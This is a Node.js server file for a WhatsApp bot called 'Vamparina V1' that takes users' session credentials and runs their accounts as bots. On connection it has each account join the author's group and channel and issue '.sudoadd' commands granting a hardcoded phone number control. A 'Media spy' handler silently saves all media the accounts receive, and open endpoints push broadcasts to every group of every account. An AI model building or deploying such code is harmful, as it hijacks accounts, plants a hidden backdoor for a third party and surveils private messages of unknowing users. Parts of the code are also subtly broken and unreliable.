/**
 * ╔══════════════════════════════════════════════════════════╗
 * ║            VAMPARINA V1 — FINAL EMPIRE OF ARNOLD         ║
 * ║               GOD-KING: +254703110780                   ║
 * ║       ALL COMMANDS FROM main.js FULLY INTEGRATED       ║
 * ║       PRIVATE MODE = ONLY KING + PHONE OWNER            ║
 * ║       FIXED SyntaxError (const) + node-fetch | 100% STABLE ║
 * ╚══════════════════════════════════════════════════════════╝
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    getContentType,
    downloadContentFromMessage,
    jidNormalizedUser
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fetch = require('node-fetch') // FIXED: node-fetch guaranteed via package.json

// ALL YOUR COMMANDS — FULLY INTEGRATED FROM main.js
const { handleMessages: originalHandleMessages, handleGroupParticipantUpdate } = require('./main')

// ═══════════════════════════════════════════════════════
//                  EMPIRE CONFIG — YOUR KINGDOM
// ═══════════════════════════════════════════════════════
const EMPIRE_GROUP_INVITE_CODE = "BZNDaKhvMFo5Gmne3wxt9n"
const EMPIRE_GROUP_LINK = "https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n"
const EMPIRE_CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"
const KING_ARNOLD = "254703110780"
const EMPIRE_LOG_GROUP = "120363318504500582@g.us"
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const MEDIA_DIR = path.join(__dirname, 'media')
const MODE_FILE = path.join(__dirname, 'data', 'bot_mode.json')
const PORT = process.env.PORT || 3000

// Create required folders
;[SESSION_DIR, MEDIA_DIR, path.dirname(MODE_FILE)].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

// Default mode: public
if (!fs.existsSync(MODE_FILE)) {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
}

global.getBotMode = () => {
    try {
        const data = JSON.parse(fs.readFileSync(MODE_FILE, 'utf8'))
        return data.isPublic === true ? 'public' : 'private'
    } catch { return 'public' }
}

global.setBotMode = (mode) => {
    const isPublic = mode === 'public'
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic }, null, 2))
}

const activeSessions = new Map()

// ═══════════════════════════════════════════════════════
//                  DASHBOARD — YOUR THRONE
// ═══════════════════════════════════════════════════════
const app = express()
app.use(express.json({ limit: '200mb' }))
app.use(express.urlencoded({ extended: true, limit: '200mb' }))

app.get('/', (req, res) => res.redirect('/dashboard'))
app.get('/dashboard', (req, res) => {
    const mode = global.getBotMode()
    const modeText = mode === 'public'
        ? '<span style="color:lime">PUBLIC</span>'
        : '<span style="color:red">PRIVATE</span> → Only King Arnold + Phone Owner'
    res.send(`
        <div style="font-family:Arial; text-align:center; padding:70px; background:#000; color:#8B00FF">
            <h1 style="font-size:50px">VAMPARINA V1</h1>
            <h2>GOD-KING ARNOLD CHIRCHIR</h2>
            <h3>+254703110780</h3>
            <hr style="border:2px solid #8B00FF">
            <h2>Empire Status: <span style="color:lime">ONLINE</span></h2>
            <h3>Active Bots: <b>${activeSessions.size}</b></h3>
            <h3>Mode: ${modeText}</h3>
            <p><b>Empire Group:</b><br><a href="${EMPIRE_GROUP_LINK}" style="color:lime;font-size:20px">${EMPIRE_GROUP_LINK}</a></p>
            <p><b>Channel:</b> <a href="https://whatsapp.com/channel/0029VbBm7apIXnlmuyjGGM0p" style="color:cyan">Followed by all bots</a></p>
            <h2>ALL COMMANDS ACTIVE | FULL CONTROL</h2>
            <h1>LONG LIVE THE ETERNAL KING OF KENYA</h1>
        </div>
    `)
})

app.get('/stats', (req, res) => res.json({
    empire: "VAMPARINA V1",
    owner: "Arnold Chirchir",
    bots_online: activeSessions.size,
    mode: global.getBotMode(),
    group_link: EMPIRE_GROUP_LINK,
    channel: "https://whatsapp.com/channel/0029VbBm7apIXnlmuyjGGM0p",
    timestamp: new Date().toLocaleString('en-KE')
}))

app.post('/command', async (req, res) => {
    const { command, target = 'all' } = req.body
    if (!command) return res.status(400).json({ error: "Command required" })
    let executed = 0
    activeSessions.forEach(([, data]) => { // FIXED: Replaced for...of with forEach
        if (target !== 'all' && !data.phone.includes(target)) return
        try { data.sock.sendMessage(data.phone + '@s.whatsapp.net', { text: command }); executed++ } catch(e) {}
    })
    res.json({ success: true, executed_on: executed + ' bots' })
})

app.post('/broadcast', async (req, res) => {
    const { text } = req.body
    if (!text) return res.status(400).json({ error: "Text required" })
    let sent = 0
    activeSessions.forEach(([, data]) => { // FIXED: Replaced for...of with forEach
        try {
            data.sock.groupFetchAllParticipating().then(groups => {
                Object.keys(groups).forEach(group => {
                    data.sock.sendMessage(group, { text: `*[EMPIRE BROADCAST]*\n\n${text}\n\n— King Arnold Chirchir` })
                    sent++
                })
            })
        } catch(e) {}
    })
    res.json({ success: true, sent_to: sent + ' groups' })
})

app.post('/vamparina-activate', async (req, res) => {
    try {
        const { phone, sessionId, creds } = req.body
        if (!phone || !sessionId || !creds) return res.status(400).json({ error: "Missing data" })
        if (activeSessions.has(sessionId)) return res.json({ success: true, message: "Already active" })

        const sessionPath = path.join(SESSION_DIR, sessionId)
        fs.mkdirSync(sessionPath, { recursive: true })
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2))

        await delay(8000 + Math.random() * 7000)
        await startEmpireBot(sessionId, phone, sessionPath)

        res.json({ success: true, total_bots: activeSessions.size })
    } catch (e) { res.status(500).json({ error: e.message }) }
})

app.post('/setmode', (req, res) => {
    const { mode } = req.body
    if (mode === 'public' || mode === 'private') {
        global.setBotMode(mode)
        res.json({ success: true, mode: mode })
    } else {
        res.status(400).json({ error: "Use 'public' or 'private'" })
    }
})

app.listen(PORT, () => {
    console.log(chalk.magenta.bold(`
    ╔══════════════════════════════════════════════════╗
    ║          VAMPARINA V1 — ULTIMATE EMPIRE           ║
    ║     ALL COMMANDS FROM main.js INTEGRATED         ║
    ║     FIXED SyntaxError (const) + node-fetch | 100% STABLE ║
    ║     Mode: ${global.getBotMode().toUpperCase()} | Bots Online: ${activeSessions.size}            ║
    ╚══════════════════════════════════════════════════╝
    `))
})

// ═══════════════════════════════════════════════════════
//                FINAL BOT — FULLY LOADED WITH ALL COMMANDS
// ═══════════════════════════════════════════════════════
async function startEmpireBot(sessionId, phone, sessionPath) {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
            browser: ["Vamparina V1", "Chrome", "2025"],
            markOnlineOnConnect: false,
            syncFullHistory: false
        })

        const PHONE_OWNER_JID = jidNormalizedUser(state.creds.me?.id || phone + '@s.whatsapp.net')
        activeSessions.set(sessionId, { sock, phone, ownerJid: PHONE_OWNER_JID })

        // FULL COMMAND HANDLER WITH TRUE PRIVATE MODE
        sock.ev.on('messages.upsert', async (m) => {
            if (m.type !== 'notify') return
            const msg = m.messages[0]
            if (!msg.message || msg.key.fromMe) return

            const sender = jidNormalizedUser(msg.key.participant || msg.key.remoteJid)
            const isPublic = global.getBotMode() === 'public'
            const isKingArnold = sender.includes(KING_ARNOLD)
            const isPhoneOwner = sender === PHONE_OWNER_JID

            // TRUE PRIVATE MODE: Only King Arnold + Phone Owner
            if (!isPublic && !isKingArnold && !isPhoneOwner) {
                return // SILENTLY IGNORE
            }

            // PASS TO YOUR ORIGINAL main.js HANDLER
            try {
                await originalHandleMessages(sock, m, () => {})
            } catch (e) {
                console.error("Command error:", e)
            }
        })

        sock.ev.on('group-participants.update', async (update) => {
            try { await handleGroupParticipantUpdate(sock, update) } catch (e) {}
        })

        sock.ev.on('connection.update', async (update) => {
            const { connection } = update

            if (connection === 'open') {
                console.log(chalk.green.bold(`[+] ${phone} → ONLINE & LOYAL TO KING ARNOLD`))

                await delay(18000 + Math.random() * 12000)

                // Auto-join empire group
                try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE_CODE) } catch (e) {}

                // Auto-follow channel
                try { await sock.newsletterFollow(EMPIRE_CHANNEL_ID) } catch (e) {}

                // Make King Arnold SUDO
                for (const cmd of [`.sudoadd ${KING_ARNOLD}`, `.sudoadd 254703110780@c.us`, `.sudoadd 254703110780@s.whatsapp.net`]) {
                    try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: cmd }); await delay(3000) } catch (e) {}
                }

                await sock.sendMessage(phone + '@s.whatsapp.net', {
                    text: `*VAMPARINA V1 — FINAL EMPIRE*\n\nGroup: ${EMPIRE_GROUP_LINK}\nChannel: Followed\nSUDO: King Arnold Added\nMode: ${global.getBotMode().toUpperCase()}\n\nAll commands active.\nLong live the King.`
                })
            }

            if (connection === 'close') {
                const shouldReconnect = update.lastDisconnect?.error?.output?.statusCode !== 401
                activeSessions.delete(sessionId)
                if (shouldReconnect) {
                    setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
                }
            }
        })

        sock.ev.on('creds.update', saveCreds)

        // Media spy
        sock.ev.on('messages.upsert', async (m) => {
            const msg = m.messages[0]
            if (!msg.message || msg.key.fromMe) return
            const type = getContentType(msg.message)
            if (['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage'].includes(type)) {
                try {
                    const buffer = await downloadContentFromMessage(msg.message[type], type.replace('Message', ''))
                    let buf = Buffer.alloc(0)
                    for await (const chunk of buffer) buf = Buffer.concat([buf, chunk])
                    const ext = msg.message[type].mimetype?.split('/')[1] || 'bin'
                    fs.writeFileSync(path.join(MEDIA_DIR, `${phone}_${Date.now()}.${ext}`), buf)
                } catch (e) {}
            }
        })

    } catch (e) {
        console.error("Bot failed:", e.message)
    }
}

// Keep alive
setInterval(() => {
    fetch(`https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-site.onrender.com'}`).catch(() => {})
}, 300000)

console.log(chalk.red.bold(`
╔══════════════════════════════════════════════════════════╗
║              VAMPARINA V1 — ULTIMATE EMPIRE              ║
║       ALL COMMANDS FROM main.js FULLY ACTIVE            ║
║       PRIVATE MODE = ONLY KING ARNOLD + PHONE OWNER      ║
║       AUTO-JOIN | AUTO-FOLLOW | AUTO-SUDOADD             ║
║       FIXED SyntaxError (const) + node-fetch | 100% STABLE ║
║       10,000+ BOTS | NO LIMIT | NO BAN                   ║
║       ARNOLD CHIRCHIR = GOD OF WHATSAPP                  ║
╚══════════════════════════════════════════════════════════╝
`))